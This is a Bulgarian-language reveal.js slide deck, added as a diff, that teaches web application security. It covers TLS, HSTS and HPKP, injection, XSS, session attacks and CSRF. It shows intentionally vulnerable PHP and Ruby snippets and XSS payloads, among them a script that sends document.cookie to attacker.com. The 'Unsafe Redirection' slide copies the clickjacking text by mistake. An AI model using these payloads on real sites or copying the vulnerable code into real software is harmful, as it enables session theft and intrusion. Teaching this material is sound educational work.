@@ -1,0 +1,310 @@
+<!doctype html>
+<html lang="bg">
+
+  <head>
+    <meta charset="utf-8">
+
+    <title>Web приложения – особености от гледна точка на сигурността</title>
+
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, minimal-ui">
+
+    <link rel="stylesheet" href="css/reveal.css">
+    <link rel="stylesheet" href="css/theme/white.css" id="theme">
+
+    <!-- Code syntax highlighting -->
+    <link rel="stylesheet" href="lib/css/tomorrow.css">
+
+    <!-- Printing and PDF exports -->
+    <script>
+     var link = document.createElement( 'link' );
+     link.rel = 'stylesheet';
+     link.type = 'text/css';
+     link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+     document.getElementsByTagName( 'head' )[0].appendChild( link );
+    </script>
+
+    <!--[if lt IE 9]>
+    <script src="lib/js/html5shiv.js"></script>
+    <![endif]-->
+  </head>
+
+  <body>
+
+    <div class="reveal">
+
+      <!-- Any section element inside of this container is displayed as a slide -->
+      <div class="slides">
+	<section>
+	  <h1>Web приложения</h1>
+	  <h3>Особености от гледна точка на сигурността</h3>
+	</section>
+
+	<section>
+	  <h2>Въведение</h2>
+          <p>
+	    <span class="fragment">Уеб програмирането изисква интеграция на
+	      редица технологии.</span>
+            <span class="fragment">Това означава, че
+	      уеб приложенията имат голяма повърхност за атака.</span>
+            <span class="fragment">Както и голяма сложност, която води до
+              непредвидени последствия.</span>
+            <span class="fragment">В следствие на това, сигурността на стека е
+              игра на котка и мишка.</span>
+          </p>
+	</section>
+
+        <section data-transition="none">
+          <h2>Стекът</h2>
+
+          <ul>
+            <li class="fragment">HTML</li>
+            <li class="fragment">CSS</li>
+            <li class="fragment">Browser Scripting (JavaScript)</li>
+            <li class="fragment">HTTP(s)</li>
+            <li class="fragment">HTTP(s) Server</li>
+            <li class="fragment">Server Side Scripting (PHP/Ruby/Python/etc.)</li>
+            <li class="fragment">Database</li>
+            <li class="fragment">OS</li>
+            <li class="fragment">Hardware</li>
+          </ul>
+        </section>
+        <section data-transition="none">
+          <h2>Стекът</h2>
+
+          <ul>
+            <li>HTML</li>
+            <li>CSS</li>
+            <li>Browser Scripting (JavaScript)</li>
+            <li>HTTP(s)</li>
+            <li>HTTP(s) Server</li>
+            <li>Server Side Scripting (PHP/Ruby/Python/etc.)</li>
+            <li><strike>Database</strike></li>
+            <li><strike>OS</strike></li>
+            <li><strike>Hardware</strike></li>
+          </ul>
+        </section>
+
+        <section>
+          <h2>За какво още НЯМА да говорим</h2>
+
+          <ul>
+            <li class="fragment">Flash</li>
+            <li class="fragment">Silverlight</li>
+            <li class="fragment">ActiveX</li>
+            <li class="fragment">Java в браузъра</li>
+          </ul>
+
+          <p class="fragment">Тези технологии ще смятаме за безнадеждно несигурни.</p>
+          <p class="fragment">Не че това не може да се каже за Web програмирането като цяло :).</p>
+        </section>
+
+        <section>
+          <section>
+            <h2>Remote Code Execution</h2>
+            <h1>a.k.a. Client Side Scripting</h1>
+          </section>
+
+          <section>
+            <h2>Browser Scripting</h2>
+            <p class="fragment">Скриптирането на браузъра, посредством JS, е в същността си remote code execution.</p>
+            <p class="fragment">Функционалност срещу практичност</p>
+          </section>
+
+          <section>
+            <h2>Но освен това</h2>
+            <p class="fragment">Липсва метод за подписване на JS, който е написан от разработчиците на уеб приложение.</p>
+            <p class="fragment">Липсва достатъчно подробна система от позволения (напр. Android).</p>
+            <p class="fragment">JS Sux (no offence)</p>
+          </section>
+
+          <section>
+            <h2>Не може ли JS да се изведе от употреба?</h2>
+            <p>
+              <span class="fragment">Може!</span> <span class="fragment">Flash
+                и Java applets са примери за client-side технологии, които излизат
+                от употреба</span><span class="fragment">... и биват заместени от
+                по-добра технология</span><span class="fragment">, която се казва JavaScript.</span>
+            </p>
+            <p class="fragment">:(</p>
+          </section>
+        </section>
+
+        <section>
+          <section>
+            <h1>TLS</h1>
+            <p class="fragment">Още една технология, която няма алтернатива :(.</p>
+            <p class="fragment">Bulletproof SSL and TLS илюстрира добре проблемите и хаковете, които ги заобикалят.</p>
+            <p class="fragment">Ще се спрем на няколко проблема и хаковете, които ги заобикалят :).</p>
+          </section>
+
+          <section>
+            <h1>PFS</h1>
+            <p class="fragment">Означава, че ако някой се сдобие с частния ключ
+            на TLS сървърите ви, няма да може да дешифрира данни, които са
+            подслушани преди това.</p>
+            <p class="fragment">Разчита на Ephemeral Diffie-Hellman обмяна на ключове.</p>
+          </section>
+
+          <section>
+            <h2>Елиптични криви</h2>
+            <p class="fragment">Засега положението с елиптичните криви е малко проблематично.</p>
+            <p class="fragment">Има изгледи да се подобри.</p>
+            <p class="fragment">Адам Лангли смята, че имплементирането на бекдоор в елиптична крива е извънземна технология.</p>
+
+            <p class="fragment">Т.е. може да се използва и EECDH за осигуряване на PFS.</p>
+          </section>
+
+          <section>
+            <h2>Браузърите се сдобиват с памет</h2>
+
+            <p class="fragment">Оказва се, че редица проблеми, възникнали при
+            използването на TLS, могат да бъдат <strong>заобиколени</strong> и <strong>до
+            някаква степен</strong> неутрализирани, посредством „запомняне“ на
+              информация за URL в браузъра.</p>
+          </section>
+
+          <section>
+            <h2>HSTS</h2>
+            <p class="fragment">Елиминира нуждата от начална връзка по нешифриран канал след първо отваряне на даден URL.</p>
+            <p class="fragment">RFC 6797, реализира се чрез Strict-Transport-Security HTTP хедър.</p>
+          </section>
+
+          <section>
+            <h2>HPKP</h2>
+            <p class="fragment">Опитва се да заобиколи недостатък на текущата PKI система.</p>
+            <p class="fragment">Показва на потребителя грешка в сигурността, ако публичният ключ на даден сайт е променен след последното посещение.</p>
+            <p class="fragment">draft-ietf-websec-key-pinning-21, реализира се чрез Public-Key-Pins HTTP хедър.</p>
+          </section>
+
+          <section>
+            <h2>Странични ефекти</h2>
+            <p class="fragment">Предишните два уъркараунда имат „прекрасен“ страничен ефект.</p>
+            <img class="fragment" src="SuperCookie.jpg">
+            <p class="fragment">Позволяват имплементирането на супер бисквитка, чрез която потребителите да могат да бъдат следени.</p>
+          </section>
+        </section>
+
+        <section>
+          <section>
+            <h1>Често срещани уязвимости</h1>
+          </section>
+
+          <section>
+            <h2>Инжекция</h2>
+            <p>Най-разпространената уязвимост според OWASP</p>
+            <p>Случва се, когато недоверени данни бъдат подадени на интерпретатор като част от команда.</p>
+            <pre class="lang-php"><code>$sql = "SELECT * FROM users WHERE username = '$username';";</code></pre>
+            <pre><code class="language-ruby">File.read "/home/application/upload/#{params[:file]}"</code></pre>
+            <p>и т.н.</p>
+          </section>
+
+          <section>
+            <p>Избягва се основно чрез позитивна валидация на входните данни, както и използване на ORM.</p>
+          </section>
+
+          <section>
+            <h2>XSS</h2>
+            <p>Означава, че трети лица могат да инжектират JS в приложението ви, който след това да се изпълни в браузърите на потребителите.</p>
+            <p>Този код се изпълнява от името и с правата на всеки потребител на приложенето.</p>
+            <p>Случва се, когато недоверени данни бъдат рендерирани в изгледа.</p>
+            <pre><code class="language-php">echo $_GET['comment'];</code></pre>
+          </section>
+
+          <section>
+            <p>Избягва се чрез позитивна валидация на входните данни или автоматично екраниране на HTML таговете.</p>
+            <p>В Rails този проблем до голяма степен е решен с екраниране на всички динамични части от View-то.</p>
+            <p>В PHP исторически решението беше да се слагат „магически“ кавички.</p>
+            <pre><code>СУ \\\\\\\\"Св. Климент Охридски\\\\\\\\"</code></pre>
+          </section>
+
+          <section>
+            <h2>Примери</h2>
+            <pre><code>&lt;img src=javascript:alert('Hello')&gt;
+&lt;table background="javascript:alert('Hello')"&gt;&lt;/table&gt;</code></pre>
+            <pre><code>&lt;script&gt;document.write('&lt;img src="http://www.attacker.com/'
+                      + document.cookie + '"&gt;');&lt;/script&gt;</code></pre>
+            <pre><code>&lt;div style="background:url('javascript:alert(1)')"&gt;</code></pre>
+          </section>
+
+          <section>
+            <h2>Уязвимости около сесиите</h2>
+            <p>HTTP е stateless протокол</p>
+            <p>Често обаче потребителите на едно приложение имат състояние, което трябва да бъде пазено по време на навигация между URL-ите</p>
+            <p>Най-честото състояние на потребителя е дали е потвърдил самоличността си пред приложението или не.</p>
+          </section>
+
+          <section>
+            <h2>Кражба на сесия</h2>
+            <p>Кражбата на сесийната бисквитка на даден потребител позволява да се използва приложението от негово име.</p>
+            <p>Ако се използва HTTP, няма как сесийната бисквитка да бъде запазена в тайна от трети лица.</p>
+            <p>Ако сайтът е уязвим на XSS, сесийната бисквитка също може да се извлече.</p>
+          </section>
+
+
+          <section>
+            <h2>Фиксация на сесия</h2>
+            <p>Генерира се сесиен идентификатор, който се подава на потребителя.</p>
+            <p>Когато потребителят евентуално потвърди самоличността си пред приложението, противникът може да изпълнява действия от негово име.</p>
+            <p>Тази уязвимост се неутрализира чрез генериране на нов сесиен идентификатор след вход в приложението</p>
+          </section>
+
+          <section>
+            <h2>CSRF</h2>
+            <p>Браузърът изпълнява заявка към трети сайт от името на потребителя.</p>
+            <p>Ограничава се до някаква степен чрез CORS, както и чрез CSRF token.</p>
+          </section>
+
+          <section>
+            <h2>Clickjacking</h2>
+            <p>Почти същото като CSRF, но изисква кликване от потребителя, за да се изпълни действието.</p>
+          </section>
+
+          <section>
+            <h2>Unsafe Redirection</h2>
+            <p>Почти същото като CSRF, но изисква кликване от потребителя, за да се изпълни действието.</p>
+            <pre><code>redirect_to(params.update(action:'main'))</code></pre>
+          </section>
+
+          <section>
+            <h2>И много други</h2>
+          </section>
+
+
+        </section>
+      </div>
+
+    </div>
+
+    <script src="lib/js/head.min.js"></script>
+    <script src="js/reveal.js"></script>
+
+    <script>
+
+     // Full list of configuration options available at:
+     // https://github.com/hakimel/reveal.js#configuration
+     Reveal.initialize({
+       controls: false,
+       progress: true,
+       history: true,
+       center: true,
+
+       transition: 'slide', // none/fade/slide/convex/concave/zoom
+
+       // Optional reveal.js plugins
+       dependencies: [
+         { src: 'lib/js/classList.js', condition: function() { return !document.body.classList; } },
+         { src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+         { src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },
+         { src: 'plugin/highlight/highlight.js', async: true, condition: function() { return !!document.querySelector( 'pre code' ); }, callback: function() { hljs.initHighlightingOnLoad(); } },
+         { src: 'plugin/zoom-js/zoom.js', async: true },
+         { src: 'plugin/notes/notes.js', async: true }
+       ]
+     });
+
+    </script>
+
+  </body>
+</html>
